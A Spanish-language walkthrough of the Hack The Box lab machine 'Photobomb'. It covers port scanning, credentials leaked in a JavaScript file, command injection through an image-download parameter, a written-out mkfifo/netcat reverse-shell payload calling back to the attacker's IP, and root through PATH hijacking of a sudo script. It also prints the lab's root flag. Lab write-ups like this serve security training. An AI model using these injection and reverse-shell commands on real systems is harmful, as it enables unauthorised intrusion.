El dia de hoy estaremos realizando la maquina Photobomb de la plataforma de Hack The Box es una maquina de dificultad facil

![](/assets/img/photobomb/machine.png)

## Enumeracion 
Empezamos haciendo un escaneo de puertos a la maquina victima
```bash
❯ nmap 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 20:16 -05
Nmap scan report for 10.10.11.182
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```

Ahora para esto puerto que estan abiertos intentemos detectar la version que corre en cada un de ellos
```bash
❯ nmap -sCV -p22,80 10.10.11.182 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 20:18 -05
Nmap scan report for 10.10.11.182
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
De lo que reporta nmap podemos ver que en el puerto 80 hay un redirect hacia http://photobomb.htb/ y como nuestra maquina no sabe a que resolver tenemos que agregar este dominio al archivo /etc/hosts
```bash
❯ echo '10.10.11.182 photobomb.htb' >> /etc/hosts
```
Otra forma de ver esto es si le tramitamos una peticion con curl al servidor podemos ver en  la cabezera Location que hace un redirect hacia ese dominio
```javascript
❯ curl -s 10.10.11.182 -I |grep 'Location'
Location: http://photobomb.htb/
```
Veamos la Web
![](/assets/img/photobomb/web.png)
Vemos que en la web hay una pagina predeterminada de un software de lo que parece ser una impresora, En la pagina hay un enlace el cual nos lleva a http://photobomb.htb/printer pero necesitamos credenciales para poder acceder a el.

Si miramos el codigo fuente de la pagina vemos que hay un script de javascript llamado photobomb.js
![](/assets/img/photobomb/co.png)

Si vemos el contenido de este archivo hay credenciales en texto claro
```bash
❯ curl -s http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
podemos ver una forma de autenticarse desde la url, usemos este mismo enlace para autenticarnos en la pagina

 al ingresar podemos ver esto
![](/assets/img/photobomb/panel.png)

## Explotacion

Hay una funcionalidad para descarga imagenes interceptemos esto con burpsuite para hacer algunas pruebas, jugando un poco con los parametros el campo filetype no se le esta aplicando una buena sanitizacion y podemos injectar comandos, ejecutemos el comando whoami y enviemos el output a un puerto de nuestra maquina
![](/assets/img/photobomb/burp.png)

Nos ponemos en escucha con nc 
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.182] 50346
wizard
```
Tenemos un Rce Consigamos una shell en donde operar mas comodos, usemos un payload de esta [pagina](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) para obtener una shell

Enviemos la consulta con nuestro payload , al momento de enviar la consulta Tenemos que arrastar el token de authorizacion de nuestra session.
```bash
❯ curl -s 'http://photobomb.htb/printer' --data 'photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.7+4444+>/tmp/f&dimensions=3000x2000' -H 'Authorization: Basic cEgwdDA6YjBNYiE='
```
Nos ponemos en escucha por el puerto que le indicamos con nc 
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.182] 57954
/bin/sh: 0: can't access tty; job control turned off
$ whoami
wizard 
```
Y obtenemos la reverShell
## Escalda de privilegios
Si miramos los privilegios que tenemos a nivel de sudoers vemos que podemos ejecutar un script de bash como root sin proporcionar contraseña
```bash
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Si miramos el script, en la linea final esta llamando a find relativamente  sin su ruta absoluta podemos aprovecharnos de esto para hacer una tecnica llamada path hacking, que consiste en modificar la ruta del PATH la cual se encarga de buscar en cada una de sus rutas el binario que le indiquemos sin tener que poner su ruta absoluta, esto a nivel de sistema no supone ningun riesgo pero cuando esta en un script setuid, es una via facil de escalar privlegios

```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Para explotar esto cambiemos al directorio /tmp y creemos un archivo con el nombre de find y demosle permisos de ejecucion
```bash
wizard@photobomb:/tmp$ cat find 
/bin/sh
wizard@photobomb:/tmp$ chmod +x find 
```
Los Path Hacking normalmente suele ser modificando nuestra propia variable de entorno $PATH, pero como esto lo vamos a ejecutar como root tenemos que antes de ejecutar el script modificar la ruta de el PATH de el usuario root, ejecutemos el script y funciono somos root.
```bash
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
# whoami
root
# bash   	
root@photobomb:/home/wizard/photobomb# cat /root/root.txt 
dda1339f19e5d4de81dcc1eec4661ece
```
Gracias por leer
